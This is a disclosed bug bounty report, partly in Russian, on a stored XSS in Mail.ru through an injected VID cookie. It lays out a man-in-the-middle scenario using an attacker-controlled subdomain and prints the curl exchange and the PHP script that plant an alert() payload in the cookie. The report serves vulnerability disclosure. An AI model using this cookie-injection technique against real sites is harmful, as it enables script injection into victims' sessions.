@@ -1,0 +1,77 @@
+ReportLink:https://hackerone.com/reports/312548
+WeaknessName:Cross-site Scripting (XSS) - DOM
+Reporter:https://hackerone.com/obmi
+ReportedTo:Mail.ru(mailru)
+BountyAmount:350.0
+Severity:medium
+State:Closed
+DateOfDisclosure:15.08.2018 17:04:51
+
+Summary:
+Cookie-based XSS via VID cookie.
+Severity was considered as medium due to fact VID cookie is HTTP only, MitM or another specific conditions are required to exploit it.
+Привет! Нашел stored xss через куку VID. Обычно такое эксплуатируется через mitm.
+Сама кука не имеет атрибутов secure и samesite, что дает возможность выставить ее по http на сервере атакующего.
+
+
+Сценарий такой:
+1. Жертва находится в сети атакующего
+2. DNS сервер сети атакующего резолвит хост attacker.mail.ru на его сервер
+3. Жертва идет на attacker.mail.ru (или атакующий ее автоматически редиректит на него)
+4. Сервер attacker.mail.ru перезаписывает куку VID
+5. Жертва получает stored xss на e.mail.ru
+
+
+Скриншоты:
+
+{F260393}
+{F260394}
+
+
+
+Поднял виртуальный хост, который вешает куку тут:
+
+```
+mihailob@kali:~/tmp$ curl -i 'http://52.34.103.214/' -H 'Host: attacker.mail.ru'
+HTTP/1.1 200 OK
+Server: nginx/1.13.8
+Date: Mon, 05 Feb 2018 15:21:20 GMT
+Content-Type: text/html
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.5.9-1ubuntu4.22
+Set-Cookie: VID='+alert(123123123)+'; expires=Tue, 06-Feb-2018 01:21:20 GMT; Max-Age=36000; path=/; domain=.mail.ru; httponly
+Access-Control-Allow-Origin: *
+
+
+<html>
+<head>
+
+</head>
+</html>
+```
+
+
+
+Листиг скрипта, который вешает куку:
+
+```
+cat index.php 
+<?php
+
+if ($_SERVER['HTTP_HOST'] == 'attacker.mail.ru') {
+        setrawcookie("VID",'\'+alert(123123123)+\'', time()+36000, "/", ".mail.ru",0,1);
+}
+
+?>
+
+<html>
+<head>
+
+</head>
+</html>
+```
+
+## Impact
+
+xss
